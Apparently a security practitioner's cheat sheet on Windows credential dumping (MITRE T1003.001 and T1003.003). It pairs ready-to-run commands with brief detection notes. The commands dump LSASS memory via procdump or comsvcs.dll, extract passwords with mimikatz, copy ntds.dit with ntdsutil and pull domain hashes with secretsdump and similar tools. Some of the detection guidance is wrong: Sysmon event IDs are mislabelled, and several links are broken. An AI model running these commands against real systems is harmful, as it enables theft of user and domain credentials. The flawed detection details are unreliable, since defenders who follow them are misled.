Lsass Memory T1003.001


For example, on the target host use procdump:

- `procdump -ma lsass.exe lsass_dump`

Locally, mimikatz can be run using:

- `sekurlsa::Minidump lsassdump.dmp`
- `sekurlsa::logonPasswords`


`rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full`

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full

sekurlsa::minidump file.dmp

sekurlsa::logonpasswords
```



ntds dumping
```cmd
ntdsutil 
activate instance ntds 
ifm 
create full c:\test 
quit 
quit
```

hash
```kali
secretsdump.py -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL

impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL

NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive

./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab
```
`


Windows Event Viewer:

- Event ID 4656 (Windows Server 2008 and later): A handle to an object was requested, which could indicate access or manipulation of LSASS process memory.
    

Sysmon:

- Event ID 10 - Process accessed: Monitor for processes accessing LSASS (Local Security Authority Subsystem Service) process memory, especially those with unusual command-line arguments or suspicious behaviors.


NTDS T1003.003

Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\NTDS\Ntds.dit` of a domain controller.[[1]](https://en.wikipedia.org/wiki/Active_Directory)

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.[[2]](http://adsecurity.org/?p=1275)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

- Volume Shadow Copy
- secretsdump.py
- Using the in-built Windows tool, ntdsutil.exe
- Invoke-NinjaCopy

Windows Event Viewer:

- Event ID 4656 (Windows Server 2008 and later): A handle to an object was requested, which could indicate access or manipulation of the [ntds.dit](https://ntds.dit) file.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to tools or techniques that can access or copy the [ntds.dit](https://ntds.dit) file, especially on DCs.
    
- Event ID 7 - File system operations: Monitor for file creations, modifications, or deletions related to the [ntds.dit](https://ntds.dit) file or its backups on DCs.
    
- Event ID 10 - Process accessed: Monitor for processes accessing the [ntds.dit](https://ntds.dit) file or its backups on DCs, especially those with unusual command-line arguments or suspicious behaviors.